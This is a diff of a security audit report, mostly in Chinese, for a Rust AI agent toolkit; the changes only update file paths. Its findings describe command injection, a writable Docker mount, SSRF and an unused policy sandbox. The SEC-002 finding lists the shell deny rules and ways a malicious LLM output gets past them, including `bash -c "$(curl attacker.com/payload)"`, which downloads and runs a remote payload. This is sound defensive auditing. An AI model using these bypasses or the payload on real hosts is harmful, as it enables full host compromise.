@@ -36,12 +36,12 @@ fn validate_url(url: &str) -> Result<String> {
 
 ### SEC-002 — OS Command Injection via `sh -c` (CWE-78)
 
-**Location**: `src/tools/shell.rs:89-91`
+**Location**: `src/tools/execution/shell.rs:89-91`
 
 **Exploit scenario**: `RunShell` 工具将用户/LLM 提供的任意字符串通过 `/bin/sh -c <command>` 执行。`policy_sandbox.rs` 中 `default_restrictive` 的 deny 列表只有 4 条极其简单的字符串（`rm -rf /`、`rm -rf ~`、`mkfs`、`> /dev/`），而且必须完全匹配子字符串。攻击者/恶意 LLM 输出 `rm\t-rf /` 或 `r\u{200B}m -rf /`，或使用 `bash -c "$(curl attacker.com/payload)"` 即可绕过，同时获得完整主机 shell 执行权。组合 SEC-001 可进行无交互 RCE。
 
 ```rust
-// src/tools/shell.rs:89
+// src/tools/execution/shell.rs:89
 let mut cmd = Command::new("/bin/sh");
 cmd.arg("-c").arg(command); // command 是用户完整控制的字符串
 ```
@@ -74,7 +74,7 @@ pub fn is_valid(&self, presented: &str) -> bool {
 
 ### SEC-004 — Docker Volume 可写挂载 (CWE-284)
 
-**Location**: `src/tools/docker_sandbox.rs:58`
+**Location**: `src/tools/transport_layer/docker_sandbox.rs:58`
 
 Docker sandbox 以读写方式将宿主机 workspace 挂载到容器 `/workspace`（无 `:ro` 标志）。容器内的代码可以覆盖宿主机工作区的任意文件，包括 `.git/hooks/pre-commit`（提交钩子注入）或 `Cargo.toml` / `build.rs`（构建时代码注入）。
 
@@ -87,7 +87,7 @@ binds: Some(vec![format!("{workspace_str}:/workspace")]),
 
 ### SEC-005 — E2B api_base SSRF (CWE-601)
 
-**Location**: `src/tools/e2b_provider.rs:59`
+**Location**: `src/tools/transport_layer/e2b_provider.rs:59`
 
 `RECURSIVE_E2B_API_BASE` 环境变量直接被用于构造所有 E2B API 请求 URL，无任何校验。攻击者若能控制此变量，可将其指向内网服务，利用 E2B 客户端的 `X-API-Key` 头向内网发起认证请求。
 
@@ -115,7 +115,7 @@ binds: Some(vec![format!("{workspace_str}:/workspace")]),
 
 ### SEC-008 — Policy Sandbox 未接入工具调用链 (CWE-668)
 
-**Location**: `src/tools/policy_sandbox.rs:64-75` + `src/tools/mod.rs:309-472`
+**Location**: `src/tools/policy_domain/policy_sandbox.rs:64-75` + `src/tools/mod.rs:309-472`
 
 `PolicyConfig` 存在于 `ToolRegistry`，但 `invoke_with_audit` 从不调用 `policy.check_shell()` 或 `policy.check_fs_path()`。注释说"tools must call `registry.policy()` and check before executing"，即依赖工具作者自己调用——而 `RunShell`、`ReadFile`、`WriteFile` 均未调用。`default_restrictive` 的 4 条 deny 规则对实际的工具调用路径完全无效。
 
@@ -133,7 +133,7 @@ binds: Some(vec![format!("{workspace_str}:/workspace")]),
 
 ### SEC-010 — E2B 沙箱泄漏风险
 
-**Location**: `src/tools/e2b_provider.rs:232-241`
+**Location**: `src/tools/transport_layer/e2b_provider.rs:232-241`
 
 E2B API key 在 `Drop` 实现中被克隆到异步任务内，若 tokio runtime 在关闭过程中，`tokio::spawn` 可能静默失败，导致沙箱泄漏。
 
